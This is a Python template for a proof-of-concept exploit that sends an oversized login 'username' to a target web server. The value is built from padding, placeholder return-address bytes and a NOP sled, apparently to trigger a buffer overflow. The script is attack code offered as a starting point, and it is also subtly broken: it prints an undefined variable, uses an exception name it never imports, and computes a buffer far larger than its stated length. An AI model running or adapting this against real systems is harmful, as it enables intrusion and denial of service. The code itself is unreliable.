#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import struct
import argparse
from urllib.parse import urlparse

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 3

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language':'en-US,en;q=0.5',
    }
    return headers

# Check if URL is an URL
def isurl(urlstr):
    try:
        urlparse(urlstr)
        return urlstr
    except ArgumentTypeError:
        raise argparse.ArgumentTypeError("Invalid URL")

def do_request(target_url,proxies,headers,session):
    """
    In: URL, HTTP Headers, Python requests session
    Performs: Example cookie handling and HTTP GET call
    Out: Python requests
    """
    data = {
        'username':create_buf(),
        'password':'1234',
    }
    r = requests.post(target_url,data=data,headers=headers,timeout=timeout,allow_redirects=False,verify=False,proxies=proxies)
    return r

def create_buf():
    # Lengths
    lentotal = 1500
    lenprefix = 780
    lenretnop = 8
    lennop = 16
    lenfiller = 36

    # Constructing vars
    prefix = b"A" * lenprefix
    eip = b"B" * 4
    offset = b"C" * 4
    suffixchar = b"D"
    filler = b"E" * lenfiller

    # NOP
    nop = b"\x90" * 32

    # Building buffer
    buf = b""
    buf += prefix
    buf += offset
    buf += nop
    buf += filler * (lentotal - len(buf))

    return buf

#######
# ANY OTHER FUNCTION HERE
#######

# Main
def main(argv):
    parser = argparse.ArgumentParser(description='Template POC')
    parser.add_argument("--url", "-u", type=isurl, required=True, help="The url of the target.")
    parser.add_argument("--proxy", "-p", type=isurl, required=False, help="Example: http://127.0.0.1:8080")
    args = parser.parse_args()

    # Check if target URL is valid
    url_parts = urlparse(args.url)
    target_url = "%s://%s%s" % (url_parts.scheme,url_parts.netloc,url_parts.path)

    # Set optional proxy
    proxies = {}
    if(args.proxy != None):
        proxy_parts = urlparse(args.proxy)
        proxies = {
            "http": "http://" + proxy_parts.netloc,
        }

    # Set HTTP Headers
    headers = http_headers()

    # Do stuff
    try:
        session = requests.Session()
        r = do_request(target_url,proxies,headers,session)
        print(s.text)
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])

